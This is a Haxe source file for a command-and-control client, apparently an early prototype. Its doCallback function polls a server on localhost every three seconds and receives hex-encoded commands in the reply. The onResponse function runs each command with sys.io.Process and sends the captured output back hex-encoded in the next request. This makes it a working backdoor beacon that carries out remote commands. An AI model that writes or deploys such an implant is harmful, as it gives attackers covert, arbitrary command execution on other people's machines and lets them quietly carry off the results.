// import tink.http.containers.*;
// import tink.http.Response;
// import tink.Url;
// import tink.url.Query;
using haxe.io.Bytes;
using haxe.Http;

class C2Client {
    static var return_values:Array<String> = ["hello world!"];

    static function main() {
        C2Client.doCallback();
    }

    static function doCallback() {
        var ret_list = return_values.map(s -> Bytes.ofString(s).toHex());
        var ret = ret_list.join(',');
        return_values = [];
        var res = Http.requestUrl('http://localhost:8000/asdf?code=1234&ret=${ret}');
        Sys.println("res:" + res);
        C2Client.onResponse(res);
        // tink.http.Client.fetch('http://localhost:8000/asdf?code=1234&ret=${ret}').all()
        //   .handle(function(o) switch o {
        //     case Success(res):
        //       C2Client.onResponse(res);
        //     case Failure(e):
        //       Sys.println("error:" + e);
        //       C2Client.onFailed();
        // });
    }

    static function onResponse(data) {
        Sys.println('result: ${data}');
        // var data = res.body.toBytes().toString();

        if (data.substring(0, "coms: [".length) == "coms: [" && data.substring(data.length - 1, data.length) == "]") {
            data = data.substring("coms: [".length, data.length - 1);
            if (data != "") {
                var split_coms = data.split(',');
                var parsed_coms = split_coms.map(s -> Bytes.ofHex(s).toString());
                if (parsed_coms.length > 0) {
                    Sys.println('parsed_coms: ${parsed_coms}');
                    // return_values = parsed_coms.map(s -> '${Sys.command(s)}');
                    return_values = parsed_coms.map(s -> (new sys.io.Process(s)).stdout.readAll().toString());
                    Sys.println('return_values: ${return_values}');
                }
            }
        }
        // Sys.println('result: ${header.statusCode} : ${data}');


        var timer = new haxe.Timer(3000);
        timer.run = function () { C2Client.doCallback(); timer.stop(); };
    }

    // static function onFailed() {
    //     var timer = new haxe.Timer(5000);
    //     timer.run = function () { C2Client.doCallback(); timer.stop(); };
    // }
}




